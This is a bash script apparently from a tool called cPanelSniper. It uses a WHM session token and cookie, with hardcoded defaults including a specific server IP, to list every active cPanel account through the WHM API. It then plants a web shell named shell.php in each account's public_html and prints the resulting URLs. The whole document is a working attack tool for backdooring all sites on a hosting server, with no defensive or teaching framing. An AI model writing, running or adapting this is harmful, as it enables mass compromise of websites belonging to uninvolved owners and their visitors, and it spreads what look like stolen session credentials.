#!/bin/bash
# Upload shell.php to all active WHM domains
# Usage: ./upload_to_domains.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
SHELL_FILE="/root/cPanelSniper/shell.php"

echo "========================================"
echo "  Upload shell.php to all domains"
echo "========================================"
echo ""

# Check shell file exists
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

echo "✓ Shell file: $SHELL_FILE"
echo ""

# List all active accounts
echo "[1/2] Listing active accounts..."
echo ""

ACCOUNTS=$(curl -sk "https://${WHM_HOST}:2087${SESSION_TOKEN}/json-api/listaccts?api.version=1" \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null | jq -r '.data.acct[] | select(.suspended == 0) | "\(.user)|\(.domain)|\(.homedir)"')

if [ -z "$ACCOUNTS" ]; then
    echo "❌ No active accounts found"
    exit 1
fi

ACCOUNT_COUNT=$(echo "$ACCOUNTS" | wc -l)
echo "✓ Found $ACCOUNT_COUNT active accounts"
echo ""

# Show accounts
echo "Accounts to upload to:"
echo "$ACCOUNTS" | while IFS='|' read -r user domain homedir; do
    echo "  • $domain ($user) → $homedir/public_html/shell.php"
done
echo ""

# Confirm
read -p "Continue upload? (y/N): " confirm
if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
    echo "Cancelled"
    exit 0
fi

echo ""
echo "[2/2] Uploading shell.php..."
echo ""

SUCCESS=0
FAILED=0

# Loop through accounts and upload
echo "$ACCOUNTS" | while IFS='|' read -r user domain homedir; do
    echo "[$((SUCCESS + FAILED + 1))/$ACCOUNT_COUNT] $domain ($user)"

    TARGET_DIR="${homedir}/public_html"

    # Check if directory exists
    if [ ! -d "$TARGET_DIR" ]; then
        echo "  ⚠️  Directory not found: $TARGET_DIR"
        FAILED=$((FAILED + 1))
        continue
    fi

    # Copy shell file
    if cp "$SHELL_FILE" "${TARGET_DIR}/shell.php"; then
        # Set permissions
        chmod 644 "${TARGET_DIR}/shell.php"
        chown "${user}:${user}" "${TARGET_DIR}/shell.php" 2>/dev/null || true

        echo "  ✅ Uploaded: https://${domain}/shell.php"
        SUCCESS=$((SUCCESS + 1))
    else
        echo "  ❌ Failed to upload"
        FAILED=$((FAILED + 1))
    fi
done

echo ""
echo "========================================"
echo "  Upload Complete"
echo "========================================"
